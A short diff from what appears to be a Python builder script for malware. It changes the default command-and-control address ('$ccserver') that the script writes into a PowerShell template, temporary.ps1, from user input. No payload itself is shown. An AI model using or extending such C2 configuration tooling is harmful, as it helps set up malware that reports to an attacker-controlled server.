@@ -154,7 +154,7 @@ def addServerPortFunc():
     server = (ip+':'+port)
 
     # Old line and New Line
-    old = '$ccserver = "192.168.9.4:80"'
+    old = '$ccserver = "192.168.9.4:8080"'
     new = '$ccserver = "' + server + '"'
 
     # Open the temporary.ps1 and replace with user input of C&C Server
